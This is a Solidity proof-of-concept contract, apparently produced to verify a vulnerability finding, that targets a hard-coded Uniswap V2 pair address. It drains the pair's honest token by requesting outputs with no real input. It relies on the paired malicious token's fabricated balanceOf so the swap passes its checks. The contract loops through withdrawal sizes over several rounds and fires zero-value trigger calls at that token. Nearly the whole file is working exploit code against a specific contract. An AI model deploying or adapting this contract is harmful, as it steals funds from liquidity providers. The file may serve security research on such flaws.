// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2CalleeLike {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FlawVerifier is IUniswapV2CalleeLike {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;
    address public honestToken;
    address public maliciousToken;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public attackerHonestBefore;
    uint256 public attackerHonestAfter;
    uint256 public successfulRounds;
    uint256 public successfulAttempts;
    uint256 public triggerAttempts;
    uint256 public callbackCount;
    uint256 public finalAttemptedAmount0Out;
    uint256 public lastObservedMaliciousPairBalance;
    uint256 public lastQuotedFakeAmountIn;

    string public lastFailureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before,) = pair.getReserves();

        // The finding's root cause remains unchanged: the pair trusts an untrusted
        // pool token's `balanceOf(pair)` during the post-transfer accounting path.
        // The provided logs prove the originally assumed orientation is infeasible at
        // this fork block: calling `swap(0, amount1Out, ...)` transfers `token1` and
        // then reverts with `INSUFFICIENT_INPUT_AMOUNT`, while `token0` is WETH-like
        // and honest. To keep the same exploit causality, the PoC therefore drains the
        // honest side by reversing the sides only:
        // 1) withdraw honest `token0` via `swap(amount0Out, 0, attacker, data)`,
        // 2) provide no real malicious-side tokens,
        // 3) rely on malicious `token1.balanceOf(pair)` to fabricate `amount1In`,
        // 4) let the pair pass K-checks, update poisoned reserves, and finalize the
        //    real honest-asset payout.
        honestToken = token0;
        maliciousToken = token1;

        attackerHonestBefore = _balanceOf(honestToken, address(this));
        lastObservedMaliciousPairBalance = _balanceOf(maliciousToken, TARGET_PAIR);

        // Strategy label: direct_or_existing_balance_first.
        // First try the pure zero-input withdrawal with no extra funding or setup.
        _runHonestWithdrawalRounds(false);

        // If direct execution alone is insufficient, use only realistic public,
        // zero-value token interactions to surface any balance-reporting path in the
        // malicious token. This preserves the same exploit root cause and ordering:
        // the pair still finalizes the withdrawal solely because it trusts the token's
        // external `balanceOf(pair)` read.
        if (_profitAmount == 0) {
            _tryZeroValueMaliciousTriggers();
            _runHonestWithdrawalRounds(true);
        }

        if (_profitAmount == 0) {
            _runHonestWithdrawalRounds(false);
        }

        (reserve0After, reserve1After,) = pair.getReserves();
        attackerHonestAfter = _balanceOf(honestToken, address(this));
        lastObservedMaliciousPairBalance = _balanceOf(maliciousToken, TARGET_PAIR);

        if (attackerHonestAfter > attackerHonestBefore) {
            _profitToken = honestToken;
            _profitAmount = attackerHonestAfter - attackerHonestBefore;
            hypothesisValidated = true;
        } else {
            hypothesisRefuted = true;
            if (bytes(lastFailureReason).length == 0) {
                lastFailureReason = "No honest-side zero-input withdrawal yielded profit at this fork block";
            }
        }
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == TARGET_PAIR, "unexpected caller");
        if (data.length == 0) {
            return;
        }

        callbackCount += 1;

        // This callback does not inject value. It only performs public zero-value
        // interactions on the malicious token immediately before the pair performs its
        // own `balanceOf(pair)` read, which is the precise accounting sink described in
        // the finding.
        _tryZeroValueMaliciousTriggers();

        uint256 observed = _balanceOf(maliciousToken, TARGET_PAIR);
        lastObservedMaliciousPairBalance = observed;

        (, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        if (observed > uint256(reserve1)) {
            lastQuotedFakeAmountIn = observed - uint256(reserve1);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runHonestWithdrawalRounds(bool useCallback) internal {
        for (uint256 round = 0; round < 4; ++round) {
            uint256 roundProfit = _attemptBestHonestWithdrawal(useCallback);
            if (roundProfit == 0) {
                break;
            }
            successfulRounds += 1;
            _profitAmount += roundProfit;
        }
    }

    function _attemptBestHonestWithdrawal(bool useCallback) internal returns (uint256 roundProfit) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        uint256 honestReserve = uint256(reserve0);
        uint256 maliciousReserve = uint256(reserve1);

        if (honestReserve <= 1 || maliciousReserve == 0) {
            lastFailureReason = "Pair has insufficient reserves for the honest-token withdrawal path";
            return 0;
        }

        uint256 balanceBefore = _balanceOf(honestToken, address(this));

        uint256[16] memory divisors = [
            uint256(64),
            48,
            40,
            32,
            96,
            128,
            24,
            20,
            16,
            12,
            10,
            8,
            6,
            4,
            3,
            2
        ];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount0Out = honestReserve / divisors[i];
            if (amount0Out == 0 || amount0Out >= honestReserve) {
                continue;
            }

            finalAttemptedAmount0Out = amount0Out;

            uint256 tokenBalanceRead = _balanceOf(maliciousToken, TARGET_PAIR);
            lastObservedMaliciousPairBalance = tokenBalanceRead;
            if (tokenBalanceRead > maliciousReserve) {
                lastQuotedFakeAmountIn = tokenBalanceRead - maliciousReserve;
            } else {
                lastQuotedFakeAmountIn = 0;
            }

            (bool ok, string memory revertReason) = _trySwap(amount0Out, useCallback);
            uint256 balanceAfter = _balanceOf(honestToken, address(this));
            uint256 gained = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;

            if (gained > 0) {
                successfulAttempts += 1;
                return gained;
            }

            if (!ok && bytes(revertReason).length != 0) {
                lastFailureReason = revertReason;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = "All honest-token withdrawal attempts reverted or returned no profit";
        }

        return 0;
    }

    function _trySwap(uint256 amount0Out, bool useCallback) internal returns (bool ok, string memory reason) {
        bytes memory data = useCallback ? abi.encodePacked(uint8(1)) : bytes("");

        try IUniswapV2PairLike(TARGET_PAIR).swap(amount0Out, 0, address(this), data) {
            return (true, "");
        } catch Error(string memory revertReason) {
            return (false, revertReason);
        } catch Panic(uint256) {
            return (false, "swap panicked");
        } catch {
            return (false, "swap reverted");
        }
    }

    function _tryZeroValueMaliciousTriggers() internal {
        bytes[8] memory payloads = [
            abi.encodeWithSelector(IERC20Like.transfer.selector, TARGET_PAIR, 0),
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), 0),
            abi.encodeWithSignature("approve(address,uint256)", TARGET_PAIR, 0),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 0),
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), TARGET_PAIR, 0),
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), address(this), 0),
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, TARGET_PAIR),
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, address(this))
        ];

        for (uint256 i = 0; i < payloads.length; ++i) {
            triggerAttempts += 1;
            maliciousToken.call(payloads[i]);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _resetRunState() internal {
        executed = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        token0 = address(0);
        token1 = address(0);
        honestToken = address(0);
        maliciousToken = address(0);
        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;
        attackerHonestBefore = 0;
        attackerHonestAfter = 0;
        successfulRounds = 0;
        successfulAttempts = 0;
        triggerAttempts = 0;
        callbackCount = 0;
        finalAttemptedAmount0Out = 0;
        lastObservedMaliciousPairBalance = 0;
        lastQuotedFakeAmountIn = 0;
        lastFailureReason = "";
        _profitToken = address(0);
        _profitAmount = 0;
    }
}
